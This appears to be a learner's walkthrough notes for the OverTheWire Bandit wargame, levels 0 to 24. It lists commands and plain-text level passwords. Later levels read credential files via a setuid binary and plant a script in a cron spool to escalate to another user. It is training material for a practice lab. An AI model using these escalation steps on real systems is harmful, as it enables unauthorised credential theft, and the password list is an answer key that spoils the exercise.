level0:
ssh bandit.labs.overthewire.org -l bandit0 -p 2220
bandit0

level1:
ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If

level2:
263JGJPfgU6LtdEvgfWU1XP5yac29mFx

level3:
cat ./
MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx

level4:
ls -a
2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ

level5:
strings ./*
4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw

level6:
find . -type f -size 1033c -readable ! -executable
HWasnPhtq9AVKe0dmk45nxy20cvUa6EG

level7:
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
"2>/dev/null" means send descriptor "2" stderr (error) to /dev/null (black hole)
morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj

level8:
grep -i 'millionth' data.txt 
"-i" is to ignore case sensitivity
dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc

level9:
sort data.txt | uniq -u
"sort" rearranges all lines in the file to be sorted, | sends that sorted output
to uniq -u which compares adjacent lines and prints only "-u" unique lines
4CKMh1JI91bUIZZPXDqGanal4xvAg0JM

level 10:
strings data.txt | grep -E '={3,}'
"strings data.txt" shows only human readable strings from the file. The output is
piped to "grep -E '={3,}" which uses a "-E"  regex to match lines containing 3 or
more = characters  
FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey

level 11:
base64 -d data.txt 
-d decodes the base64 encoded data.txt
dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr

level 12:
tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt
takes every uppercase (A-Z) and lowercase (a-z) letter from data.txt  and uses tr to 
replace each letter with the one 13 positions ahead in the alphabet (ROT13). 
"<" redirects the file as input to tr instead of typing it manually.
7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4

level 13:
mktemp -d, then we cp over data.txt, then we did "xxd -r data.txt > file.bin" and 
from then on check the type using "file" and decompressed with "gzip -d" or "bzip -d"
for gzip, you have to rename the suffiz to end with "gz" or "z" for it to decompress.

FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn

level 14:
scp -P 2220 bandit13@bandit.labs.overthewire.org:~/sshkey.private ~/Desktop/techPortfolio/overthewire/bandit/
chmod 600 sshkey.private
ssh -i sshkey.private bandit.labs.overthewire.org -l bandit14 -p 2220

scp copy sshkey.private from bandit13 to my pc where the colon ":" separates the remote 
host from the remote file path. "chmod" restricts key permissions to only me for 
security reasons. The final ssh uses -i to log in with the key. 
The password for the next level is stored in /etc/bandit_pass/bandit14

level 15:
cat /etc/bandit_pass/bandit14
MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS

nc localhost 30000
use the above password and get:
8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo

level 16:
ncat --ssl localhost 30001
kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx

level 17:
nmap -p31000-32000 localhost
openssl s_client -connect localhost:[port]
ncat --ssl localhost 31790

Check "rsakey17" for the rsakey

nmap scans the local machine for open ports within the range 31000 to 32000 and shows
which ones are accepting connections (listeing). openssl s_client attempts to connect
to the given port using SSL/TLS, displaying the handshake details and certificates if 
the service supports encryption. ncat -ssl connects to port 31790 on the local machine
using SSL/TLS, letting you send and receive encrypted data directly.

level 18:
ssh -i rsakey17 bandit.labs.overthewire.org -l bandit17 -p 2220
diff passwords.old passwords.new
grep 'x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO' passwords.new 
x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO

level 19:
scp -P 2220 bandit18@bandit.labs.overthewire.org:~/readme ~/Desktop/techPortfolio/overthewire/bandit/
cat readme
cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8

level 20:
./bandit20-do cat /etc/bandit_pass/bandit20
this works because bandit20-do is owned by bandit20 and has the setuid bit set rws
for owner. When the file is exectured, the OS makes the program run with bandit20
as the owner, which therefore allows cat of the /etc/bandit_pass/bandit20 to get 
password:
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO

level 21:
do below on one terminal(1), trial and error until you find a free port:
nc -l 42424

open a new terminal(2) and do:
./suconnect 42424

now the suconnect is waiting for terminal(1) to send level 20 password, when pasted
we get the below password:
EeoULMCra2q0dSkYj561DX7s1CpBuOBt

level 22:
ls -l /etc/cron.d/
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q

level 23:
ls /etc/cron.d/
cat /etc/cron.d/cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh

the resulting cat will yield:
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget

then we can do below, since the cron file is sending the password into "/tmp/$mytarget":
myname="bandit23"
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo $mytarget

then we will get the address of "/tmp/$mytarget":
8ca319486bfbbc3663ea0fbe81326349

now we can check the file with "cat /tmp/8ca319486bfbbc3663ea0fbe81326349", password:
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

level 24:
same procedure as previous level until we get the below which shows that the cron job is
running as user bandit24:
cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

then checking the .sh file:

cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

"cd /tmp", do this to have permissions to create a file (our script)
cd b23 since it already exists
there will be a file and we will do:
cat getpass.sh, which gives: 
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass

now we can write our script:
cat > grab.sh << 'EOF'
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
chmod 644 /tmp/bandit24_pass
> EOF

chmod +x grab.sh (make it executable)
cp grab.sh /var/spool/bandit24/foo/run_me.sh

now after a minute the cron will execute the file and we can:
cat /tmp/bandit24_pass
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

[PASSWORD ABOVE, EXPLANATION BELOW]

The cron script runs as the user bandit24 every minute. It first sets the variable 
myname to the result of whoami, which in this case will be bandit24. It then changes 
directory to /var/spool/$myname/foo, which resolves to /var/spool/bandit24/foo. Inside 
that directory, it loops over all files, including hidden ones, but skips . and ... For 
each file, it uses stat to check the file’s owner, and if the owner is bandit23, it 
executes the file with a 60-second timeout using timeout -s 9 60, meaning it will be 
killed with SIGKILL if it runs too long. After executing, it deletes the file. The 
result is that any executable file owned by bandit23 placed in /var/spool/bandit24/foo 
will be executed with bandit24’s privileges and then removed. Our method works because 
we can write to that directory but cannot write in our home, so we prepare a script in 
/tmp and copy it into /var/spool/bandit24/foo. When copied there, it remains owned by 
bandit23, which satisfies the ownership check. Since the script runs as bandit24, it 
can read /etc/bandit_pass/bandit24 and copy that password to a world-readable location 
like /tmp/b24_pass.txt. After the cron job runs, the original script is deleted, but 
the password file in /tmp remains accessible to us.
